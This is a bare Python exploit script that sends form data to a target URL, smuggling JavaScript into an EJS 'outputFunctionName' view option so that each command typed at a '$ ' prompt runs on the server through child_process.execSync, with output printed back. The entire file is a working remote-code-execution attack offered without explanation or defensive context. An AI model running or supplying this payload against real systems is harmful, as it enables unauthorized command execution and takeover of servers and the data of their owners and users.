import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("url")
args = parser.parse_args()


while True:
    try:
        data = {"settings[view options][outputFunctionName]": f"x;return process.mainModule.require('child_process').execSync('{input("$ ")}');s"}
        req = requests.post(args.url, data=data)
        if req.status_code == 200:
            print(req.text.strip())
    except KeyboardInterrupt:
        exit(0)